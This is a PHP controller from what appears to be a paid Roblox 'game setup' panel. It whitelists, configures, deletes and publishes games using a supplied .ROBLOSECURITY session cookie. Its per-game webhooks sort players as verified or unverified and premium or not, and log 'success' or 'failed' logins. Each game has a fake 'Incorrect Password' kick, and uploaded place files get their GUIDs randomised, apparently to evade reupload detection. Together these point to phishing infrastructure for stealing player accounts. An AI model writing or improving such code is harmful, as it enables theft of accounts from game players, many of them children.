<?php

namespace app\controller;

use think\facade\View;
use think\facade\Session;
use app\http\middleware\AuthCheck;
use app\http\middleware\MembershipCheck;
use app\http\middleware\DiscordVerifyCheck;
use app\http\middleware\BlacklistCheck;
use app\model\UserModel;
use app\model\GameModel;
use app\model\DownloadLinksModel;
use think\facade\Request;
use Unirest\Request as UnirestRequest;
use Unirest\Request\Body as UnirestBody;

class Setup
{

    //Private Functions
    protected $middleware = [AuthCheck::class,DiscordVerifyCheck::class,BlacklistCheck::class];

    private function getUserInfo()
    {
        $userid = Session::get("user_id");
        return UserModel::where("id", $userid)->find();
    }

    private function assignError($error, $viewassign, $view)
    {
        View::assign(array_merge($viewassign, [
            "error" => $error,
        ]));
        return View::fetch($view);
    }

    private function assignSuccess($success, $viewassign, $view)
    {
        View::assign(array_merge($viewassign, [
            "success" => $success,
        ]));
        return View::fetch($view);
    }


    private function handleGameDeletion($userid, $viewassign, $games)
    {
        $user = $this->getUserInfo();
        $gameid = Request::param("gameid");

        $gamecheck = GameModel::where("gameid", $gameid)->findOrEmpty();

        if ($gamecheck->ownerid != $userid) {
            return $this->assignError("You Don't Have Permission to Delete This Game.", $viewassign, "games");
        }

        $gamedelete = new GameModel();
        $gamedelete->where("gameid", $gameid)->delete();

        $pageSize = 6; // Number of records to display per page
        $games = GameModel::where("ownerid", $userid)->paginate($pageSize);

        $this->fetchGameInfo($games);
        $viewassign = array_merge(['games' => $games], $viewassign);
        $this->sendSetupLogs($user->username, $user->profile_pic, "Game Deleted Successfully");
        return $this->assignSuccess("Game Deleted", $viewassign, "games");
    }


    private function handleGameWhitelist($userid, $viewassign)
    {
        $user = $this->getUserInfo();
        $gamecount = GameModel::where("ownerid", $userid)->count();
        $gameid = Request::param("gameid");
        $game_limit = (int) $user->stats->game_limit;

        $gamecheck = GameModel::where("gameid", $gameid)->findOrEmpty();

        if (empty(Request::has("gameid"))) {
            return $this->assignError("Please fill up all the fields", $viewassign, "whitelist");
        }

        $gameid = Request::param("gameid");

        if (!is_numeric($gameid)) {
            return $this->assignError("Make sure your game id is an integer.", $viewassign, "whitelist");
        }

        $gamecheck = GameModel::where("gameid", $gameid)->findOrEmpty();

        if (!$gamecheck->isEmpty()) {
            return $this->assignError("Game already taken.", $viewassign, "whitelist");
        }

        if ($gamecount >= intval($user->stats->game_limit)) {
            return $this->assignError("You have reached the maximum limit of games allowed.", $viewassign, "whitelist");
        }

        $response = UnirestRequest::get("https://apis.roblox.com/universes/v1/places/$gameid/universe");
        if ($response->body->universeId === null) {
            return $this->assignError("Invalid Game ID", $viewassign, "whitelist");
        }

        $game = new GameModel();
        $game->save([
            "gameid" => $gameid,
            "ownerid" => $userid,
            "configinfo" => [
                "webhook" => [
                    "visit" => "",
                    "un-nbc" => "",
                    "un-premium" => "",
                    "ve-nbc" => "",
                    "ve-premium" => "",
                    "success" => "",
                    "failed" => "",
                ],
                "game_config" => [
                    "loginkick" => true,
                    "loginkickmessage" => "Incorrect Password",
                    "agekick" => 7,
                    "agekickmessage" => "New user is not allowed to join the game",
                    "verifiedkick" => true,
                    "verifiedkickmessage" => "Verified user is not allowed to join the game",
                ],
            ],
        ]);
        $this->sendSetupLogs($user->username, $user->profile_pic, "Game Whitelisted Successfully");
        return $this->assignSuccess("Game Whitelisted.", $viewassign, "whitelist");
    }

    private function replace_referents($input) {
        $reference_cache = [];
      
        $input = preg_replace_callback('/(RBX[A-F0-9]{32})/i', function ($match) use (&$reference_cache) {
          $reference = $match[1];
          if (!array_key_exists($reference, $reference_cache)) {
            $reference_cache[$reference] = "RBX" . bin2hex(random_bytes(16));
          }
          return $reference_cache[$reference];
        }, $input);
      
        return $input;
    }
      
    private function replace_script_guids($input) {
        $guid_cache = [];
      
        $input = preg_replace_callback('/\{[A-F0-9]{8}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{12}\}/i', function ($match) use (&$guid_cache) {
          $guid = $match[0];
          if (!array_key_exists($guid, $guid_cache)) {
            $guid_cache[$guid] = "{" . strtoupper(bin2hex(random_bytes(16))) . "}";
          }
          return $guid_cache[$guid];
        }, $input);
      
        return $input;
    }

    private function sendSetupLogs($username, $profilePic, $action)
    {
            $webhookUrl = config('embed_setup.setup_logs');

            $payload = json_encode([
                'username' => config('embed_setup.embed_name'),
                'avatar_url' => config('embed_setup.avatar_url'),
                'embeds' => [
                    [
                        'title' => '',
                        "timestamp" => date("c", strtotime("now")),
                        "footer" => [
                            "text" => "Setup logs - krispypatata on top",
                            "icon_url" => config("embed_setup.avatar_url"),
                            ],
                        'author' => [
                            'name' => $username,
                            'icon_url' => $profilePic,
                        ],
                        'fields' => [
                            [
                                'name' => 'Setup configuration logs',
                                'value' => "```md\n# $action                                \n```",
                                'inline' => true,
                            ],
                        ],
                        'color' => hexdec(config("embed_setup.embed_color")),
                    ],
                ],
            ], JSON_UNESCAPED_SLASHES);

            $ch = curl_init($webhookUrl);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
            curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                'Content-Type: application/json',
                'Content-Length: ' . strlen($payload),
            ]);

        $response = curl_exec($ch);
        if (curl_errno($ch)) {
            error_log('Discord webhook error: ' . curl_error($ch));
        }
        curl_close($ch);
    }
    
    private function handlePublishGame ($viewassign) {

        if (!Request::has("gamename") || !Request::has("gamedescription") || !Request::has("cookie") || !Request::file("rbxfile")) {
            return $this->assignError("Please fill up all the fields", $viewassign, "publish");
        }

        $cookie = Request::post("cookie");
        $gamename = Request::post("gamename");
        $gamedescription = Request::post("gamedescription");
        $visibility = Request::post("visibility");
        $uploadedFile = Request::file("rbxfile");

        $allowedExtensions = ['rbxl', 'rbxlx'];
        $fileExtension = strtolower($uploadedFile->extension());

        if (!in_array($fileExtension, $allowedExtensions)) {
            return $this->assignError("Error: Invalid file extension. Only .rbxl and .rbxlx files are allowed.", $viewassign, "publish");
        }

        $headers = [
            "Content-Type" => "application/json",
            "User-Agent" => "Roblox/WinInet",
            "Cookie" => ".ROBLOSECURITY=$cookie",
        ];

        $checkcsrf = UnirestRequest::post("https://auth.roblox.com/v2/logout",$headers);

        if (empty($checkcsrf->headers["x-csrf-token"])) {
            return $this->assignError("Invalid Cookie", $viewassign, "publish");
        }

        $csrftoken = $checkcsrf->headers["x-csrf-token"];

        $headers = [
            "Content-Type" => "application/json",
            "Aceept" => "application/json",
            "User-Agent" => "Roblox/WinInet",
            "Cookie" => ".ROBLOSECURITY=$cookie",
            "X-CSRF-TOKEN" => $csrftoken,
        ];
        $data = ["templatePlaceId" => "379736082"];
        $body = UnirestBody::json($data);
        $createplace = UnirestRequest::post("https://apis.roblox.com/universes/v1/universes/create",$headers ,$body);
        
        if ($createplace->code != 200) {
            return $this->assignError("Failed To Create Place", $viewassign, "publish");
        }

        $gameid = $createplace->body->rootPlaceId;
        $uniID = $createplace->body->universeId;

        $status = "deactivate";
        if ($visibility === "public"){
            $status= "Activate";
        }

        UnirestRequest::post("https://develop.roblox.com/v1/universes/$uniID/$status",$headers);
        
        $gamedata = [
            "name" => $gamename,
            "description" => $gamedescription,
            "universeAvatarType" => "MorphToR6",
            "universeAnimationType" => "Standard",
            "maxPlayerCount" => 45,
            "allowPrivateServers" => false,
            "privateServerPrice" => 0,
            "permissions" => [
                "IsThirdPartyTeleportAllowed" => true,
                "IsThirdPartyPurchaseAllowed" => true,
            ],
        ];

        $body = UnirestBody::json($gamedata);
        UnirestRequest::patch("https://develop.roblox.com/v2/universes/$uniID/configuration",$headers ,$body);
        $file = file_get_contents($uploadedFile->getRealPath());
        if ($fileExtension === "rbxlx"){
            $file = $this->replace_referents($file);
            $file = $this->replace_script_guids($file);
        }

        $apidata = json_encode([
            "cloudAuthUserConfiguredProperties" => [
                "name" => "jdsbijvbdijsv",
                "description" => "",
                "isEnabled" => true,
                "allowedCidrs" => [
                    "0.0.0.0/0"
                ],
                "scopes" => [
                    [
                        "scopeType" => "universe-places",
                        "targetParts" => [
                            "$uniID"
                        ],
                        "operations" => [
                            "write"
                        ]
                    ]
                ]
            ]
        ]);
        
        $getapikey = UnirestRequest::post("https://apis.roblox.com/cloud-authentication/v1/apiKey", $headers ,$apidata);
        if ($getapikey->code != 200) {
            return $this->assignError("Failed To Create Key", $viewassign, "publish");
        }
        $apikey = $getapikey->body->apikeySecret;
        $apidata = $getapikey->body->cloudAuthInfo;
        $apiid = $getapikey->body->cloudAuthInfo->id;
        $newhead = [
            "Content-Type" => "application/octet-stream",
            "User-Agent" => "Roblox/WinInet",
            "Cookie" => ".ROBLOSECURITY=$cookie",
	        "x-csrf-token" => $csrftoken,
            "x-api-key" => $apikey,
        ];
        $publishplace = UnirestRequest::post("https://apis.roblox.com/universes/v1/$uniID/places/$gameid/versions?versionType=Published" ,$newhead ,$file);

        if ($publishplace->code != 200) {
            return $this->assignError("Failed To Publish Game $publishplace->code", $viewassign, "publish");
        }

        $deleteapikey = UnirestRequest::delete("https://apis.roblox.com/cloud-authentication/v1/apiKey/$apiid", $headers);

        $viewassign["gameid"] = $gameid;
        $user = $this->getUserInfo();
        $this->sendSetupLogs($user->username, $user->profile_pic, "Game Published Successfully");
        return $this->assignSuccess("Successfully Published a game", $viewassign, "publish");

    }

    private function handleConfigGame($userid,$viewassign) {
        if (!Request::has("visit") || !Request::has("un-nbc") || !Request::has("un-premium") || !Request::has("ve-nbc") || !Request::has("ve-premium") || !Request::has("success") || !Request::has("failed")) {
            return $this->assignError("Please fill up all the Webhooks fields", $viewassign, "configure");
        }

        if (!Request::has("loginkick") || !Request::has("loginkickmessage") || !Request::has("agekick") || !Request::has("agekickmessage") || !Request::has("verifiedkick") || !Request::has("verifiedkickmessage")) {
            return $this->assignError("Please fill up all the Game Config fields", $viewassign, "configure");
        }

        if (empty(Request::param("id"))) {
            return $this->assignError("Empty Configure ID", $viewassign, "configure");
        }

        $config_id = Request::param("id");
        $check_game = GameModel::where("id",$config_id)->findOrEmpty();

        if ($check_game->isEmpty()){
            return $this->assignError("Invalid Configure ID", $viewassign, "configure");
        }

        if ($check_game->ownerid !==  $userid) {
            return $this->assignError("You Dont Have Permission to Configure this Game.", $viewassign, "configure");
        }

        //Webhooks
        $viewassign["visit_webhook"] = Request::param("visit");
        $viewassign["un_nbc_webhook"] = Request::param("un-nbc");
        $viewassign["un_premium_webhook"] = Request::param("un-premium");
        $viewassign["ve_nbc_webhook"] = Request::param("ve-nbc");
        $viewassign["ve_premium_webhook"] = Request::param("ve-premium");
        $viewassign["success_webhook"] = Request::param("success");
        $viewassign["failed_webhook"] = Request::param("failed");


        //Game Config
        $viewassign["loginkick"] = $this->getOptionMarkup(Request::param("loginkick"));
        $viewassign["loginkickmessage"] = Request::param("loginkickmessage");
        $viewassign["agekick"] = Request::param("agekick");
        $viewassign["agekickmessage"] = Request::param("agekickmessage");
        $viewassign["verifiedkick"] = $this->getOptionMarkup(Request::param("verifiedkick"));
        $viewassign["verifiedkickmessage"] = Request::param("verifiedkickmessage");

        $user = GameModel::where("id", $config_id)->find();
        $user->save([
            'configinfo' => [

                'webhook' =>[
                    'visit' => Request::param("visit"),
                    'un-nbc' => Request::param("un-nbc"),
                    'un-premium' => Request::param("un-premium"),
                    've-nbc' => Request::param("ve-nbc"),
                    've-premium' => Request::param("ve-premium"),
                    'success' => Request::param("success"),
                    'failed' => Request::param("failed"),
                ],

                'game_config' =>[
                    'loginkick' => Request::param("loginkick"),
                    'loginkickmessage' => Request::param("loginkickmessage"),
                    'agekick' => Request::param("agekick"),
                    'agekickmessage' => Request::param("agekickmessage"),
                    'verifiedkick' => Request::param("verifiedkick"),
                    'verifiedkickmessage' => Request::param("verifiedkickmessage"),
                ]

            ]
        ]);
        $this->sendSetupLogs($user->username, $user->profile_pic, "Game Configured Successfully");
        return $this->assignSuccess("Successfully Configured.", $viewassign, "configure");
        

    }

    private function fetchGameInfo(&$games)
    {
        foreach ($games as &$game) {
            $gameid = $game["gameid"];
            $getuniverse = UnirestRequest::get("https://apis.roblox.com/universes/v1/places/$gameid/universe");

            if ($getuniverse->body->universeId) {
                $uniID = $getuniverse->body->universeId;

                $getgameinfo = UnirestRequest::get("https://games.roblox.com/v1/games?universeIds=$uniID");
                $jsongameinfo = json_decode($getgameinfo->raw_body, true);

                $getgameicon = UnirestRequest::get("https://thumbnails.roblox.com/v1/games/icons?universeIds=$uniID&size=256x256&format=Png&isCircular=false");
                $jsonicon = json_decode($getgameicon->raw_body, true);

                $game["icon"] = $jsonicon["data"][0]["imageUrl"];
                $game["universeId"] = $uniID;
                $game["gameInfo"] = $jsongameinfo;
                $game["name"] = $jsongameinfo["data"][0]["name"]; // Add the "name" to the game data
            }
        }
    }

    private function getOptionMarkup($value)
    {
        $enabledOption = '<option value="true">Enable</option>';
        $disabledOption = '<option value="false">Disable</option>';

        if (!filter_var($value, FILTER_VALIDATE_BOOLEAN)) {
            return $disabledOption . $enabledOption;
        } else {
            return $enabledOption . $disabledOption;
        }
    }

    //Public Functions Serve The Main Pages

    public function whitelist()
    {
        $user = $this->getUserInfo();
        $userexpiration = $user->membership_expiration;
        $usermembership = $user->membership;

        $expirationmessage = '';

        if ($userexpiration) {
            $expirationDate = new \DateTime($userexpiration);
            $formatedexpire = $expirationDate->format('M j, Y'); 
        
            if ($usermembership !== 'Customer') {
                $message = '';
            } else {
                if ($formatedexpire) {
                    $message = "Expire in $formatedexpire";
                } else {
                    $message = "No expiration date.";
                }
            }
        }
        
        $viewassign = [
            "username" => $user->username,
            "membership" => $user->membership,
            "profile_pic" => $user->profile_pic, 
            "discord_server_link" => config("app.discord_server_link"),
            "app_name" => config("app.app_name"),
            "app_image" => config("app.app_image"),
            "membership_expiration" => $message,  
            "game_limit" =>  $user->stats->game_limit,
        ];

        if (Request::isPost() && Request::has("whitelist-game")) {
            return $this->handleGameWhitelist($user->id, $viewassign);
        }
        View::assign($viewassign);
        return View::fetch("whitelist");
    }

    public function publish()
    {
        $user = $this->getUserInfo();
        $userexpiration = $user->membership_expiration;
        $usermembership = $user->membership;

        $expirationmessage = '';

        if ($userexpiration) {
            $expirationDate = new \DateTime($userexpiration);
            $formatedexpire = $expirationDate->format('M j, Y'); 
        
            if ($usermembership !== 'Customer') {
                $message = 'No expiration date.';
            } else {
                if ($formatedexpire) {
                    $message = "Expire in $formatedexpire";
                } else {
                    $message = "No expiration date.";
                }
            }
        }
        
        $viewassign = [
            "username" => $user->username,
            "membership" => $user->membership,
            "profile_pic" => $user->profile_pic,
            "discord_server_link" => config("app.discord_server_link"),
            "app_name" => config("app.app_name"),
            "app_image" => config("app.app_image"),
            "membership_expiration" => $message,  
        ];

        if (Request::isPost() && Request::has("publish-game")) {
            return $this->handlePublishGame($viewassign);
        }
        View::assign($viewassign);
        return View::fetch("publish");
    }

    public function download()
    {
        $user = $this->getUserInfo();
        $userexpiration = $user->membership_expiration;
        $usermembership = $user->membership;

        $expirationmessage = '';

        if ($userexpiration) {
            $expirationDate = new \DateTime($userexpiration);
            $formatedexpire = $expirationDate->format('M j, Y'); 
        
            if ($usermembership !== 'Customer') {
                $message = 'No expiration date.';
            } else {
                if ($formatedexpire) {
                    $message = "Expire in $formatedexpire";
                } else {
                    $message = "No expiration date.";
                }
            }
        }


        $viewassign = [
            "username" => $user->username,
            "membership" => $user->membership,
            "membership_expiration" => $message,
            "profile_pic" => $user->profile_pic,
            "discord_server_link" => config("app.discord_server_link"),
            "app_name" => config("app.app_name"),
            "app_image" => config("app.app_image"),
        ];

        $downloadlinks = DownloadLinksModel::select();
        
        View::assign(array_merge($viewassign, [
            "downloadlinks" => $downloadlinks,
        ]));
        return View::fetch("download");
    }

    public function games()
    {
        $user = $this->getUserInfo();
        $userexpiration = $user->membership_expiration;
        $usermembership = $user->membership;

        $expirationmessage = '';

        if ($userexpiration) {
            $expirationDate = new \DateTime($userexpiration);
            $formatedexpire = $expirationDate->format('M j, Y'); 
        
            if ($usermembership !== 'Customer') {
                $message = 'No expiration date.';
            } else {
                if ($formatedexpire) {
                    $message = "Expire in $formatedexpire";
                } else {
                    $message = "No expiration date.";
                }
            }
        }

        $viewassign = [
            "username" => $user->username,
            "membership" => $user->membership,
            "membership_expiration" => $message,
            "profile_pic" => $user->profile_pic,
            "discord_server_link" => config("app.discord_server_link"),
            "app_name" => config("app.app_name"),
            "app_image" => config("app.app_image"),
        ];

        $pageSize = 6; // Number of records to display per page
        $games = GameModel::where("ownerid", $user->id)->paginate($pageSize);

        if (Request::isPost() && Request::has("delete-game")) {
            return $this->handleGameDeletion($user->id, $viewassign, $games);
        }

        $this->fetchGameInfo($games);

        View::assign(array_merge($viewassign, [
            "games" => $games,
        ]));
        return View::fetch("games");
    }


    public function configure()
    {
        $user = $this->getUserInfo();
        $userexpiration = $user->membership_expiration;
        $usermembership = $user->membership;

        $expirationmessage = '';

        if ($userexpiration) {
            $expirationDate = new \DateTime($userexpiration);
            $formatedexpire = $expirationDate->format('M j, Y'); 
        
            if ($usermembership !== 'Customer') {
                $message = 'No expiration date.';
            } else {
                if ($formatedexpire) {
                    $message = "Expire in $formatedexpire";
                } else {
                    $message = "No expiration date.";
                }
            }
        }

        if (empty(Request::param("id"))) {
            return redirect("/games");
        }

        $config_id = Request::param("id");
        $check_game = GameModel::where("id",$config_id)->findOrEmpty();

        if ($check_game->isEmpty()){
            return redirect("/games");
        }

        if ($check_game->ownerid !==  $user->id) {
            return redirect("/games");
        }


        $gameid = $check_game->gameid;
        $getuniverse = UnirestRequest::get("https://apis.roblox.com/universes/v1/places/$gameid/universe");
        $uniID = $getuniverse->body->universeId;
        $getgameinfo = UnirestRequest::get("https://games.roblox.com/v1/games?universeIds=$uniID");
        
        $gamename = $getgameinfo->body->data[0]->name;

        $webhooks = [
            'visit_webhook' => $check_game->configinfo->webhook["visit"],
            'un_nbc_webhook' => $check_game->configinfo->webhook["un-nbc"],
            'un_premium_webhook' => $check_game->configinfo->webhook["un-premium"],
            've_nbc_webhook' => $check_game->configinfo->webhook["ve-nbc"],
            've_premium_webhook' => $check_game->configinfo->webhook["ve-premium"],
            'success_webhook' => $check_game->configinfo->webhook["success"],
            'failed_webhook' => $check_game->configinfo->webhook["failed"],
        ];

        $game_config = [
            'gamename' => $gamename,
            'loginkick' => $this->getOptionMarkup($check_game->configinfo->game_config["loginkick"]),
            'loginkickmessage' => $check_game->configinfo->game_config["loginkickmessage"],
            'agekick' => $check_game->configinfo->game_config["agekick"],
            'agekickmessage' => $check_game->configinfo->game_config["agekickmessage"],
            'verifiedkick' => $this->getOptionMarkup($check_game->configinfo->game_config["verifiedkick"]),
            'verifiedkickmessage' => $check_game->configinfo->game_config["verifiedkickmessage"],
        ];

        
        $viewassign = [
            "username" => $user->username,
            "membership" => $user->membership,
            "membership_expiration" => $message,
            "profile_pic" => $user->profile_pic,
            "config_id" => $config_id,
            "discord_server_link" => config("app.discord_server_link"),
            "app_name" => config("app.app_name"),
            "app_image" => config("app.app_image"),
        ];
        
        $viewassign = array_merge($viewassign, $webhooks,$game_config);
        
        if (Request::isPost() && Request::has("config-game")) {
            return $this->handleConfigGame($user->id, $viewassign);
        }
        View::assign($viewassign);
        return View::fetch("configure");
    }


}
